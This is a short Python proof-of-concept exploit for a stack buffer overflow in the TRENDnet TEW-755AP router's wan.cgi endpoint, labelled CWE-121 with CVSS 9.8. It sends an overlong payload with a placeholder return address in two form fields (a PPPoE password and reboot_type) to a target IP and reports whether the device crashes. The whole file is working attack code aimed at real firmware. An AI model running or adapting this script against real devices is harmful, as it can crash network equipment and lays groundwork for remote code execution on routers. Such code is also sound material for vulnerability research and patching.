#!/usr/bin/env python3
"""PoC: TEW-755AP cgi/ssi WAN Config Stack Overflow | CWE-121 | CVSS 9.8"""
import struct, requests, sys
T=sys.argv[1] if len(sys.argv)>1 else "192.168.10.1"
P=b"A"*68+struct.pack(">I",0x41414141)
print(f"TEW-755AP cgi/ssi Stack Overflow (16 points, 374 simexp hits)")
for n,d in [("pppoe_pw",{"wan_type":"pppoe","cameo.wan.wan_pppoe_password_00":P.decode("latin-1")}),("reboot_type",{"reboot_type":P.decode("latin-1")})]:
    try:r=requests.post(f"http://{T}/cgi-bin/wan.cgi",data=d,timeout=5);print(f"  {n}:{r.status_code}")
    except:print(f"  {n}:crashed")
